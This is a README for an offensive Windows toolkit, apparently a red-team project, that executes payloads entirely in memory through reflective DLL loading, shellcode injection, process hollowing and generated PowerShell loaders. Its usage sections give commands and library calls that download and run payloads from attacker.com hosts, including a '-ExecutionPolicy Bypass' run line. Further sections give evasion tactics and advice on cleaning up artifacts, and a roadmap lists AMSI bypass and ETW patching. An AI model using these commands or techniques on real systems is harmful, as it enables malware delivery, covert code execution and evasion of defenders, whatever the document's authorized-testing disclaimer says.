# Memory-Only Execution Toolkit

A modular Python framework for executing payloads entirely in memory without touching disk.

## 📁 Project Structure

```
memory_executor/
├── __init__.py                      # Main package initialization
├── main.py                          # CLI entry point
├── README.md                        # This file
├── requirements.txt                 # Python dependencies
├── core/                            # Core functionality
│   ├── __init__.py
│   ├── constants.py                 # Windows API constants
│   ├── structures.py                # Windows API structures
│   └── memory_executor.py          # Main coordinator class
├── techniques/                      # Execution techniques
│   ├── __init__.py
│   ├── dll_injection.py            # Reflective DLL loading
│   ├── shellcode_injection.py      # Shellcode injection
│   ├── process_hollowing.py        # Process hollowing
│   └── pe_execution.py             # In-memory PE execution
├── generators/                      # Script generators
│   ├── __init__.py
│   └── powershell_generator.py     # PowerShell script generation
├── utils/                           # Utility functions
│   ├── __init__.py
│   └── helpers.py                   # PE parsing, validation
└── examples/                        # Example scripts
    └── demo.py                      # Usage demonstrations
```

## 🚀 Features

### Execution Techniques
- **Reflective DLL Loading**: Load DLLs directly into memory
- **Shellcode Injection**: Execute shellcode in process memory
- **Process Hollowing**: Inject payload into legitimate process
- **In-Memory PE Execution**: Run executables without disk writes
- **PowerShell Reflective Loading**: Generate PowerShell loaders

### Capabilities
- **No Disk Artifacts**: All payloads executed entirely in memory
- **Remote Download**: Fetch payloads from URLs
- **Process Injection**: Inject into current or remote processes
- **PE Parsing**: Parse and validate PE headers
- **Script Generation**: Generate PowerShell reflective loaders

## 📋 Requirements

- **Platform**: Windows (x64)
- **Python**: 3.6+
- **Privileges**: Administrator privileges required for some techniques

**Note**: This toolkit is specifically designed for Windows systems and uses Windows API calls via ctypes.

## 🔧 Installation

### Option 1: Direct Usage
```bash
# Clone or download the project
cd memory_executor

# Run directly
python main.py --help
```

### Option 2: Install as Package
```bash
# From project directory
pip install -e .

# Use from anywhere
memory-executor --help
```

## 💻 Usage

### Reflective DLL Injection

Load DLL from URL into memory:
```bash
python main.py --dll-inject http://attacker.com/payload.dll
```

### Shellcode Injection

**Into current process:**
```bash
python main.py --shellcode fc4883e4f0e8c0000000...
```

**Into remote process:**
```bash
python main.py --shellcode fc4883e4f0e8c0000000... --pid 1234
```

### Process Hollowing

Create legitimate process and inject payload:
```bash
python main.py --hollow C:\Windows\System32\notepad.exe payload.exe
```

### In-Memory PE Execution

Download and execute PE from URL:
```bash
python main.py --execute-pe http://attacker.com/payload.exe
```

### PowerShell Reflective Loader

Generate PowerShell script:
```bash
python main.py --generate-ps http://attacker.com/payload.bin loader.ps1

# Execute generated script
powershell.exe -ExecutionPolicy Bypass -File loader.ps1
```

## 📚 Module Usage

### Using as Python Library

```python
from memory_executor import MemoryExecutor

# Initialize executor
executor = MemoryExecutor()

# Reflective DLL injection
executor.reflective_dll_injection("http://attacker.com/evil.dll")

# Shellcode injection (current process)
shellcode = "fc4883e4f0e8c0000000..."
executor.inject_shellcode(shellcode)

# Shellcode injection (remote process)
executor.inject_shellcode(shellcode, target_pid=1234)

# Process hollowing
with open("payload.exe", "rb") as f:
    payload_data = f.read()

executor.process_hollowing(
    r"C:\Windows\System32\notepad.exe",
    payload_data
)

# In-memory PE execution
executor.execute_pe_from_memory("http://attacker.com/payload.exe")

# Generate PowerShell loader
executor.generate_powershell_reflective_loader(
    "http://attacker.com/payload.bin",
    "loader.ps1"
)
```

### Advanced Usage

```python
from memory_executor.utils import parse_pe_header, validate_url

# Parse PE headers
with open("payload.exe", "rb") as f:
    pe_data = f.read()

pe_info = parse_pe_header(pe_data)

if pe_info and pe_info['is_valid']:
    print(f"Image Base: 0x{pe_info['image_base']:X}")
    print(f"Image Size: {pe_info['image_size']} bytes")
    print(f"Entry Point RVA: 0x{pe_info['entry_point_rva']:X}")
    print(f"Architecture: {'64-bit' if pe_info['is_64bit'] else '32-bit'}")

# Validate URL
if validate_url("http://example.com/payload.dll"):
    print("Valid URL")
```

## 🔍 Technique Explanations

### 1. Reflective DLL Loading

Downloads DLL from URL and loads it directly into memory without writing to disk.

**Process:**
1. Download DLL to memory
2. Allocate executable memory
3. Copy DLL to allocated memory
4. Parse PE headers
5. Execute DLL entry point

**Advantages:**
- No disk artifacts
- Bypasses file-based detection
- Fast execution

### 2. Shellcode Injection

Injects raw shellcode into process memory and executes it.

**Process:**
1. Decode shellcode from hex
2. Open target process (or use current)
3. Allocate executable memory
4. Write shellcode to memory
5. Create thread to execute shellcode

**Use Cases:**
- Execute position-independent code
- Minimal footprint
- Maximum flexibility

### 3. Process Hollowing

Creates legitimate process, unmaps its memory, and injects malicious code.

**Process:**
1. Create target process in suspended state
2. Get process context
3. Read PEB to find image base
4. Unmap original executable
5. Allocate memory for payload
6. Write payload to process
7. Update entry point
8. Resume process

**Advantages:**
- Appears as legitimate process
- Evades process name-based detection
- Good for persistence

### 4. In-Memory PE Execution

Downloads and executes complete PE file from memory.

**Process:**
1. Download PE to memory
2. Parse PE headers
3. Allocate memory at preferred base
4. Copy PE to memory
5. Execute entry point

**Use Cases:**
- Run tools without disk writes
- Quick execution
- Minimal artifacts

### 5. PowerShell Reflective Loading

Generates PowerShell script for reflective payload loading.

**Features:**
- Downloads payload to memory
- Allocates executable memory
- Changes memory permissions
- Executes payload
- No disk writes

## ⚠️ Detection Risks

### What Defenders See

1. **Memory Scans**: Injected code visible in memory dumps
2. **API Monitoring**: Suspicious API call patterns:
   - VirtualAlloc/VirtualAllocEx
   - WriteProcessMemory
   - CreateRemoteThread
   - NtUnmapViewOfSection

3. **Behavioral Analysis**:
   - Process creation patterns
   - Memory allocation anomalies
   - Network connections from unexpected processes

4. **Network Traffic**: Payload downloads visible in network logs

### Evasion Techniques

- Use HTTPS to encrypt traffic
- Inject into trusted processes
- Randomize memory allocations
- Implement API call obfuscation
- Add delays to avoid behavioral flags

## 🛡️ OPSEC Considerations

### Best Practices

1. **Pre-Execution**:
   - Verify payload functionality in lab
   - Check for defensive tools (EDR/AV)
   - Obtain proper authorization
   - Document testing activities

2. **During Execution**:
   - Use encrypted channels (HTTPS)
   - Avoid obvious process names
   - Monitor for detection
   - Have fallback plans

3. **Post-Execution**:
   - Clean up allocated memory
   - Remove network artifacts
   - Document results
   - Debrief with stakeholders

### Red Flags

Avoid these behaviors that trigger alerts:
- Suspicious parent-child process relationships
- Memory allocations with RWX permissions
- Cross-process memory writes
- Unsigned code execution
- Network connections from system processes

## 🛠️ Development

### Adding Custom Technique

Create new technique module:
```python
# techniques/custom_technique.py
class CustomTechnique:
    def __init__(self, kernel32):
        self.kernel32 = kernel32
    
    def execute(self, params):
        # Implementation
        pass
```

Update MemoryExecutor:
```python
# core/memory_executor.py
def custom_technique(self, params):
    from ..techniques.custom_technique import CustomTechnique
    
    technique = CustomTechnique(self.kernel32)
    return technique.execute(params)
```

### Extending Functionality

- Add new Windows API structures to `core/structures.py`
- Add constants to `core/constants.py`
- Create utility functions in `utils/helpers.py`
- Add script generators to `generators/`

## 📄 License

For authorized security testing and educational purposes only.

## ⚖️ Legal Disclaimer

This tool is provided for **authorized security testing only**.

- Memory execution techniques may trigger security alerts
- Always obtain written permission before testing
- Understand applicable laws and regulations
- The authors assume no liability for misuse

**USE AT YOUR OWN RISK**

## 🤝 Contributing

Contributions welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

## 📞 Support

For issues, questions, or suggestions:
- Open an issue on GitHub
- Check existing documentation
- Review the code comments

## 🔄 Version History

- **v1.0.0** - Initial release
  - Reflective DLL loading
  - Shellcode injection
  - Process hollowing
  - In-memory PE execution
  - PowerShell script generation

## 🎯 Roadmap

- [ ] AMSI bypass techniques
- [ ] ETW patching
- [ ] Module stomping
- [ ] Thread hijacking
- [ ] APC injection
- [ ] Fiber execution
- [ ] Additional evasion techniques

## 🔗 Related Projects

- Windows Log Manipulation Framework
- Linux Log Cleanup Framework
- Timestamp Stomping Toolkit
- Secure File Deletion Framework